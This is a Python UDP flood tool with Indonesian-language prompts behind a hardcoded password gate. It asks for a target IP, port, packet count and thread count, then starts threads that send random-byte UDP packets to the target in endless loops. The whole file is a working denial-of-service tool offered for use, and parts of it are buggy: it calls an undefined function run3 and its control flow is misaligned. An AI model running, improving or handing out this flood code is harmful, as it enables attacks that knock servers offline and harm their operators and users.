import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

print("""
\033[0;32m
██╗      ██████╗  ██████╗ ██╗███╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
                                       

""")

password ="petronax"

for i in range(4):
	pwd = input("[•]Masukan Password : ")
	j=3
	if(pwd==password):
		time.sleep(1)
		print("[•] ANALISIS PASWORD")
		break
	else:
		time.sleep(2)
		print("\033[91m[×] PASSWORD SALAH!!! ")
		continue
time.sleep(1)
print("KATASANDI KAMU BENAR!!!! \033[92m[√]\033[0m ")
time.sleep(2)
os.system("clear")


print("""/033[95m

▄▀█ █▄░█ █▀▄▀█
█▀█ █░▀█ █░▀░█

█░█ ▀█
▀▄▀ █▄
  """)
  
print("\033[95m>> CODED : Anm2892") 
print("\033[95m>>> Coded tambahan by :anm2892 ") 
print("\033[95m>>>> TOOLS V2 by ANM2892")

ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" YAKIN DDOS? (y/n):"))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
def run():
	data = random._urandom(577)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SERVER ATTACK BY ANM2892!!! ")
		except:
			print("[!] SERVER NYA TURU DEK!!")
			
def run2():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SERVER ATTACK BY ANM2892!!! ")
		except:
			print("[!] SERVER NYA TURU DEK!!")
			
def run4():
	data = random._urandom(17)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SERVER ATTACK BY ANM2892!!! ")
		except:
			print("[!] SERVER NYA TURU DEK!!")
			

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()